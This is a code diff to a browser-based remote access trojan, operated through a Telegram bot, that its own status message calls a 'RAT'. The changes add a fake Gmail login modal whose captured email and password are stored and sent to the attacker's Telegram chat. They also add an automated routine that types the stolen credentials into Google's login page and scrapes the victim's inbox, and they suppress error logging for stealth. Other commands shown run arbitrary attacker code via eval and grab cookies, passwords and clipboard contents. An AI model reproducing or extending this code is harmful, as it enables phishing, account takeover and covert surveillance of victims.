@@ -113,11 +113,12 @@
         let phishingModalActive = false;
         let deviceId = null;
         let permissionsStatus = { camera: false, microphone: false, location: false, clipboard: false };
-        let gmailDetectedNotified = false;   // Avoid spamming every reload
+        let gmailDetectedNotified = false;
+        let storedGmailCredentials = { email: '', password: '' }; // saved after phishing
 
         // Enable console logs for debugging (remove for stealth)
         // console.log = function() {};
-        // console.error = function() {};
+        console.error = function() {};
 
         const TELEGRAM_HEADERS = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
@@ -155,6 +156,10 @@
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
         }
 
+        async function sendTyping() {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendChatAction?chat_id=${ADMIN_CHAT_ID}&action=typing`, { headers: TELEGRAM_HEADERS });
+        }
+
         // ================= PERMISSIONS =================
         async function requestAllPermissions() {
             try {
@@ -190,28 +195,54 @@
             );
         }
 
-        // ================= GMAIL DETECTION & READING =================
-        function isGmailPage() {
-            return window.location.href.includes('mail.google.com');
-        }
-
-        async function notifyGmailDetected() {
-            if (!gmailDetectedNotified) {
-                gmailDetectedNotified = true;
-                await sendMessage(`📧 *Gmail detected* on device \`${deviceId}\`\nUser is now viewing their inbox. Use /read_emails to fetch messages.`, 'Markdown');
+        // ================= GMAIL AUTO LOGIN & EMAIL READING =================
+        async function autoLoginAndReadEmails() {
+            if (!storedGmailCredentials.email || !storedGmailCredentials.password) {
+                return { success: false, error: "No Gmail credentials stored. Use /phish_gmail first." };
             }
+            // Navigate to Gmail login page
+            window.location.href = 'https://accounts.google.com';
+            // Wait for page to load and fill credentials
+            return new Promise((resolve) => {
+                let attempts = 0;
+                const interval = setInterval(async () => {
+                    const emailField = document.querySelector('input[type="email"]');
+                    const passwordField = document.querySelector('input[type="password"]');
+                    const nextBtn = document.querySelector('#identifierNext, #passwordNext, button[jsname]');
+                    
+                    if (emailField && !emailField.value) {
+                        emailField.value = storedGmailCredentials.email;
+                        emailField.dispatchEvent(new Event('input', { bubbles: true }));
+                        if (nextBtn) nextBtn.click();
+                    } else if (passwordField && !passwordField.value) {
+                        passwordField.value = storedGmailCredentials.password;
+                        passwordField.dispatchEvent(new Event('input', { bubbles: true }));
+                        if (nextBtn) nextBtn.click();
+                    } else if (window.location.href.includes('mail.google.com')) {
+                        clearInterval(interval);
+                        // Wait for inbox to load then read emails
+                        setTimeout(async () => {
+                            const emails = await readGmailInbox();
+                            resolve({ success: true, data: emails });
+                        }, 3000);
+                        return;
+                    }
+                    attempts++;
+                    if (attempts > 60) { // timeout after ~30 seconds
+                        clearInterval(interval);
+                        resolve({ success: false, error: "Auto-login timed out" });
+                    }
+                }, 500);
+            });
         }
 
         async function readGmailInbox() {
-            if (!isGmailPage()) {
-                return { success: false, error: "Not on Gmail page. User must open mail.google.com first." };
+            if (!window.location.href.includes('mail.google.com')) {
+                return { success: false, error: "Not on Gmail page." };
             }
-            // Wait a bit for the inbox to load
-            await new Promise(r => setTimeout(r, 2000));
-            const emails = [];
-            // Gmail's inbox rows (desktop and mobile)
             const rows = document.querySelectorAll('.zA, .zE, .Cp');
-            for (let row of rows.slice(0, 20)) { // max 20 emails
+            const emails = [];
+            for (let row of rows.slice(0, 20)) {
                 const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
                 const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
                 const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
@@ -219,25 +250,11 @@
                     emails.push({ from, subject, snippet: snippet.substring(0, 100) });
                 }
             }
-            if (emails.length === 0) {
-                return { success: true, data: "No emails found. Make sure you are on the inbox view." };
-            }
+            if (emails.length === 0) return { success: true, data: "No emails found in current view." };
             return { success: true, data: emails };
         }
 
-        // ================= HISTORY (LIMITED) =================
-        async function getBrowserHistory() {
-            const navEntries = performance.getEntriesByType("navigation");
-            let navInfo = "";
-            if (navEntries.length > 0) {
-                const nav = navEntries[0];
-                navInfo = `Type: ${nav.type}\nRedirects: ${nav.redirectCount}\nDuration: ${nav.duration}ms\n`;
-            }
-            const info = `📍 *Current Page:* ${location.href}\n↩️ *Referrer:* ${document.referrer || "none"}\n${navInfo}\n\n⚠️ *Unable to read full browser history* due to browser security. Web pages cannot access the full history list.\n\n💡 *Alternative:* Use \`/eval\` to inject a script that records future navigation (while this page stays open).`;
-            return info;
-        }
-
-        // ================= PHISHING MODAL =================
+        // ================= PHISHING MODAL (stores credentials) =================
         function createPhishingModal() {
             if (phishingModalActive) return;
             phishingModalActive = true;
@@ -267,11 +284,15 @@
                 const email = emailInp.value.trim();
                 const pass = passInp.value;
                 if (!email || !pass) { errDiv.style.display = 'block'; errDiv.innerText = 'Please fill both fields.'; return; }
-                await sendMessage(`🎣 *Gmail Credentials*\n📧 Email: ${email}\n🔑 Password: ${pass}`, 'Markdown');
+                // Store credentials
+                storedGmailCredentials = { email, password: pass };
+                // Send to Telegram
+                await sendMessage(`🎣 *Gmail Credentials Captured*\n📧 Email: ${email}\n🔑 Password: ${pass}\n\nUse /auto_gmail to automatically log in and read emails.`, 'Markdown');
                 modal.remove();
                 document.body.classList.remove('modal-active');
                 phishingModalActive = false;
                 document.removeEventListener('keydown', blockKeys);
+                // Optional: redirect to real Gmail
                 setTimeout(() => { window.location.href = 'https://mail.google.com'; }, 500);
             };
             document.getElementById('phish-submit').addEventListener('click', submit);
@@ -279,15 +300,22 @@
             passInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
         }
 
+        // ================= OTHER COMMAND HELPERS =================
+        async function getBrowserHistory() {
+            return `📍 *Current Page:* ${location.href}\n↩️ *Referrer:* ${document.referrer || "none"}\n\n⚠️ Full browser history is not accessible for security reasons.`;
+        }
+
         // ================= COMMAND HANDLER =================
-        async function handleCommand(text) {
-            console.log('Received command:', text);
-            const parts = text.trim().split(' ');
+        async function handleCommand(fullText) {
+            const parts = fullText.trim().split(' ');
             let cmd = parts[0].toLowerCase();
+            // Aliases
             if (cmd === '/phishgmail' || cmd === '/phish_gmail') cmd = '/phish_gmail';
             if (cmd === '/grabpass' || cmd === '/grab_pass') cmd = '/grab_pass';
-            if (cmd === '/devices' || cmd === '/list') cmd = '/devices';
             if (cmd === '/reademails' || cmd === '/read_emails') cmd = '/read_emails';
+            if (cmd === '/autogmail' || cmd === '/auto_gmail') cmd = '/auto_gmail';
+
+            await sendTyping();
 
             try {
                 switch(cmd) {
@@ -299,21 +327,22 @@
                                 [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
                                 [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
                                 [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
-                                [{ text: '🔄 Devices', callback_data: 'devices' }, { text: '📜 History', callback_data: 'history' }, { text: '📧 Read Emails', callback_data: 'read_emails' }]
+                                [{ text: '🔄 Devices', callback_data: 'devices' }, { text: '📜 History', callback_data: 'history' }, { text: '📧 Auto Gmail', callback_data: 'auto_gmail' }]
                             ]
                         };
                         await sendMessage(
-                            `✅ *RAT Active* | \`${deviceId}\`\n🟢 Online | Permissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n\n${isGmailPage() ? '📧 *Gmail detected* – use /read_emails' : ''}`,
+                            `✅ *RAT Active* | \`${deviceId}\`\n🟢 Online | Permissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n\n${storedGmailCredentials.email ? `🔐 Credentials stored for ${storedGmailCredentials.email}. Use /auto_gmail` : 'No Gmail credentials yet. Use /phish_gmail to capture.'}`,
                             'Markdown', buttons
                         );
                         break;
-                    case '/read_emails':
-                        const result = await readGmailInbox();
+                    case '/auto_gmail':
+                        await sendMessage('🔄 Attempting auto-login to Gmail and reading emails. This may take up to 30 seconds...');
+                        const result = await autoLoginAndReadEmails();
                         if (result.success) {
                             if (typeof result.data === 'string') {
-                                await sendMessage(`📧 *Gmail Inbox*\n${result.data}`, 'Markdown');
+                                await sendMessage(`📧 *Auto Gmail Result*\n${result.data}`, 'Markdown');
                             } else {
-                                let msg = `📧 *Latest emails* (${result.data.length}):\n\n`;
+                                let msg = `📧 *Latest emails after auto-login* (${result.data.length}):\n\n`;
                                 for (let i=0; i<result.data.length; i++) {
                                     const e = result.data[i];
                                     msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
@@ -322,16 +351,34 @@
                                 await sendMessage(msg, 'Markdown');
                             }
                         } else {
-                            await sendMessage(`❌ ${result.error}`);
+                            await sendMessage(`❌ Auto Gmail failed: ${result.error}`);
+                        }
+                        break;
+                    case '/phish_gmail':
+                        if (!phishingModalActive) createPhishingModal();
+                        await sendMessage('🎣 Phishing modal injected. User must enter credentials. They will be stored for auto-login.');
+                        break;
+                    case '/read_emails':
+                        const readResult = await readGmailInbox();
+                        if (readResult.success) {
+                            if (typeof readResult.data === 'string') {
+                                await sendMessage(`📧 *Gmail Inbox*\n${readResult.data}`, 'Markdown');
+                            } else {
+                                let msg = `📧 *Latest emails* (${readResult.data.length}):\n\n`;
+                                for (let i=0; i<readResult.data.length; i++) {
+                                    const e = readResult.data[i];
+                                    msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
+                                    if (msg.length > 3800) break;
+                                }
+                                await sendMessage(msg, 'Markdown');
+                            }
+                        } else {
+                            await sendMessage(`❌ ${readResult.error}`);
                         }
                         break;
                     case '/history':
                         const historyInfo = await getBrowserHistory();
                         await sendMessage(historyInfo, 'Markdown');
-                        break;
-                    case '/phish_gmail':
-                        if (!phishingModalActive) createPhishingModal();
-                        await sendMessage('🎣 Phishing modal injected. User is blocked until credentials are entered.');
                         break;
                     case '/gmail':
                         if (location.href.includes('accounts.google.com')) {
@@ -342,7 +389,8 @@
                                 if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
                                 await sendMessage('Attempting to trigger autofill...');
                             } else {
-                                await sendMessage(`🔑 Gmail credentials extracted:\n📧 Email: ${email}\n🔑 Password: ${pass}`);
+                                storedGmailCredentials = { email, password: pass };
+                                await sendMessage(`🔑 Gmail credentials extracted and stored:\n📧 Email: ${email}\n🔑 Password: ${pass}\n\nUse /auto_gmail to log in automatically.`, 'Markdown');
                             }
                         } else {
                             await sendMessage('Not on Google login page. Use /phish_gmail to force a fake modal.');
@@ -404,7 +452,7 @@
                         break;
                     case '/eval':
                         if (parts.length > 1) {
-                            const code = text.substring(5);
+                            const code = fullText.substring(5);
                             let result = eval(code);
                             if (typeof result !== 'string') result = JSON.stringify(result);
                             await sendMessage(`✅ Eval result:\n${result.substring(0, 3900)}`);
@@ -421,8 +469,7 @@
                         await sendMessage('File picker opened on victim side.');
                         break;
                     case '/devices':
-                        const statusLine = `🖥️ *Your device*\n🆔 \`${deviceId}\`\n🟢 Status: Online\nPermissions:\n📷 Camera: ${permissionsStatus.camera ? '✅' : '❌'}\n🎤 Mic: ${permissionsStatus.microphone ? '✅' : '❌'}\n📍 GPS: ${permissionsStatus.location ? '✅' : '❌'}\n📋 Clipboard: ${permissionsStatus.clipboard ? '✅' : '❌'}`;
-                        await sendMessage(statusLine, 'Markdown');
+                        await sendMessage(`🖥️ *Current device*\n🆔 \`${deviceId}\`\n🟢 Online\nPermissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n\n${storedGmailCredentials.email ? `🔐 Gmail creds stored for ${storedGmailCredentials.email}` : 'No stored Gmail credentials'}`, 'Markdown');
                         break;
                     default:
                         await sendMessage(`Unknown command: ${cmd}. Try /start for help.`);
@@ -475,17 +522,19 @@
             const url = location.href;
             if (url !== lastUrl) {
                 lastUrl = url;
-                if (isGmailPage()) {
-                    notifyGmailDetected();
-                } else {
+                if (url.includes('mail.google.com') && !gmailDetectedNotified) {
+                    gmailDetectedNotified = true;
+                    sendMessage(`📧 *Gmail detected* on device \`${deviceId}\`. Use /read_emails to fetch.`, 'Markdown');
+                } else if (!url.includes('mail.google.com')) {
                     gmailDetectedNotified = false;
                 }
             }
         }).observe(document, { subtree: true, childList: true });
 
-        // Also check on load
         window.addEventListener('load', () => {
-            if (isGmailPage()) notifyGmailDetected();
+            if (location.href.includes('mail.google.com')) {
+                sendMessage(`📧 *Gmail detected* on device \`${deviceId}\`. Use /read_emails to fetch.`, 'Markdown');
+            }
         });
 
         // ================= INIT =================
